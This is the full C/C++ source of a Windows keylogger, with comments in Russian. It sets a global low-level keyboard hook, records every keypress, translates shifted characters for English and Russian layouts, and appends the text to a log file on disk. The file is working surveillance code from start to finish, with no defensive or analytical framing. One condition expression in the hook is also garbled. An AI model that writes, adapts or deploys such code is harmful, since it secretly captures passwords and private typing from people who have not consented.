#include <Windows.h>
#include <Winuser.h>
#include <malloc.h> // для работы с динамической памятью
#include <locale.h> // локализация
#include <string.h>
#include <stdio.h> // для записи в файл

// константы
#define SIZE_STR 1 << 8 //размер строки который вмещает 256 елементов
#define PATH L"D:\\1\key.log" //путь к файлу
#define RUS 0x0419 // определение раскладки клавиатуры
#define ENG 0x0409

BOOL IsCaps(void); // проверка зажат ли капс или шифт
LRESULT CALLBACK LogKey(int iCode, WPARAM wParam, LPARAM lParam); // логирование
VOID WriteToFile(LPWSTR wstr); // запись в файл
LPWSTR Text(const wchar_t* str); // приведение типа для строк

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, PSTR pCmd, int nCmdShow)
{
	// хендл хук, дескриптор хука
	HHOOK hHook = SetWindowsHookEx(
		WH_KEYBOARD_LL, // параметр, который указывает на то что мы ставим хук на нажатие клавиатуры
		LogKey, // указатель на функцию в которой будет обработка
		NULL, NULL // wParam and lParam
	);
	MSG msg = { 0 };
	while (GetMessage(&msg, NULL, 0, 0))
	{
		TranslateMessage(&msg);
		DispatchMessage(&msg);
	}

	UnhookWindowsHookEx(hHook);
	return 0;
}



LPWSTR Text(const wchar_t* str)
{
	return const_cast<LPWSTR>(str);
}

VOID WriteToFile(LPWSTR wstr)
{
	FILE* f = NULL;
	if (!_wfopen_s(&f, PATH, L"ab"))
	{
		fwrite(wstr, sizeof(WCHAR), wcslen(wstr), f);
		fclose(f);
	}
}

BOOL IsCaps(void) // проверка находимся ли мы в нижнем регистре
{
	// VK - virtual key
	// GetKeyState - для определения состояния нажатия кнопки
	if ((GetKeyState(VK_CAPITAL) & 0x0001) != 0 ^
		(GetKeyState(VK_SHIFT) & 0x8000) != 0)
	
		return TRUE;
	
	return FALSE;
}

LRESULT CALLBACK LogKey(int iCode, WPARAM wParam, LPARAM lParam)
{
	_wsetlocale(LC_ALL, L".866");
	if (wParam == WM_KEYDOWN)
	{
		PKBDLLHOOKSTRUCT pHook = (PKBDLLHOOKSTRUCT)lParam; // структура для хранения метаданных с кнопки для получения кода кнопки
		// передача ид кнопки и смещение на 16 элементов
		DWORD iKey = MapVirtualKey(pHook->vkCode, NULL) << 16; // для получения индекса кнопки
		if (!(pHook->vkCode, +1 << 5))
			iKey |= 0x1 << 24;
		LPWSTR wstr = (LPWSTR)calloc(SIZE_STR + 1, sizeof(WCHAR)); // создание динамической строки
		GetKeyNameText(iKey, wstr, SIZE_STR); // получение имени кнопки
		if (wcslen(wstr) > 1)
		{
			WriteToFile(Text(L"["));
			WriteToFile(wstr);
			WriteToFile(Text(L"]"));
		}
		else
		{
			if (IsCaps() == TRUE)
			{
				switch (wstr[0])
				{
				case '1':
					WriteToFile(Text(L"!"));
					break;
				case '2':
					if (LOWORD(GetKeyboardLayout(0)) == ENG)
						WriteToFile(Text(L"@"));
					else if (LOWORD(GetKeyboardLayout(0)) == RUS)
						WriteToFile(Text(L"\""));
					break;
				case '3':
					if (LOWORD(GetKeyboardLayout(0)) == ENG)
						WriteToFile(Text(L"#"));
					else if (LOWORD(GetKeyboardLayout(0)) == RUS)
						WriteToFile(Text(L"№"));
					break;
				case '4':
					if (LOWORD(GetKeyboardLayout(0)) == ENG)
						WriteToFile(Text(L"$"));
					else if (LOWORD(GetKeyboardLayout(0)) == RUS)
						WriteToFile(Text(L";"));
					break;
				case '5':
					WriteToFile(Text(L"%"));
					break;
				case '6':
					if (LOWORD(GetKeyboardLayout(0)) == ENG)
						WriteToFile(Text(L"^"));
					else if (LOWORD(GetKeyboardLayout(0)) == RUS)
						WriteToFile(Text(L":"));
					break;
				case '7':
					if (LOWORD(GetKeyboardLayout(0)) == ENG)
						WriteToFile(Text(L"&"));
					else if (LOWORD(GetKeyboardLayout(0)) == RUS)
						WriteToFile(Text(L"?"));
					break;
				case '8':
					WriteToFile(Text(L"*"));
					break;
				case '9':
					WriteToFile(Text(L"("));
					break;
				case '0':
					WriteToFile(Text(L")"));
					break;
				case '-':
					WriteToFile(Text(L"_"));
					break;
				case '=':
					WriteToFile(Text(L"+"));
					break;
				case '[':
					if (LOWORD(GetKeyboardLayout(0)) == ENG)
						WriteToFile(Text(L"{"));
					else if (LOWORD(GetKeyboardLayout(0)) == RUS)
						WriteToFile(Text(L"Х"));
					break;
				case ']':
					if (LOWORD(GetKeyboardLayout(0)) == ENG)
						WriteToFile(Text(L"}"));
					else if (LOWORD(GetKeyboardLayout(0)) == RUS)
						WriteToFile(Text(L"Ъ"));
					break;
				case ';':
					if (LOWORD(GetKeyboardLayout(0)) == ENG)
						WriteToFile(Text(L":"));
					else if (LOWORD(GetKeyboardLayout(0)) == RUS)
						WriteToFile(Text(L"Ж"));
					break;
				case '\'':
					if (LOWORD(GetKeyboardLayout(0)) == ENG)
						WriteToFile(Text(L"\""));
					else if (LOWORD(GetKeyboardLayout(0)) == RUS)
						WriteToFile(Text(L"Э"));
					break;
				case ',':
					if (LOWORD(GetKeyboardLayout(0)) == ENG)
						WriteToFile(Text(L"<"));
					else if (LOWORD(GetKeyboardLayout(0)) == RUS)
						WriteToFile(Text(L"Б"));
					break;
				case '.':
					if (LOWORD(GetKeyboardLayout(0)) == ENG)
						WriteToFile(Text(L">"));
					else if (LOWORD(GetKeyboardLayout(0)) == RUS)
						WriteToFile(Text(L"Ю"));
					break;
				case '/':
					if (LOWORD(GetKeyboardLayout(0)) == ENG)
						WriteToFile(Text(L"?"));
					else if (LOWORD(GetKeyboardLayout(0)) == RUS)
						WriteToFile(Text(L","));
					break;
				case '\\':
					if (LOWORD(GetKeyboardLayout(0)) == ENG)
						WriteToFile(Text(L"|"));
					else if (LOWORD(GetKeyboardLayout(0)) == RUS)
						WriteToFile(Text(L"/"));
					break;
				case '`':
					if (LOWORD(GetKeyboardLayout(0)) == ENG)
						WriteToFile(Text(L"~"));
					else if (LOWORD(GetKeyboardLayout(0)) == RUS)
						WriteToFile(Text(L"Ё"));
					break;

				default:
					WriteToFile(wstr);
					break;
				}

			}
			else
			{
				wstr[0] = tolower(wstr[0]);
				WriteToFile(wstr);
			}
		}
		free(wstr); // очистка строки что бы приложение не разрастлось в оперативке
	}
	return CallNextHookEx(NULL, iCode, wParam, lParam); // переправляем данные дальше
}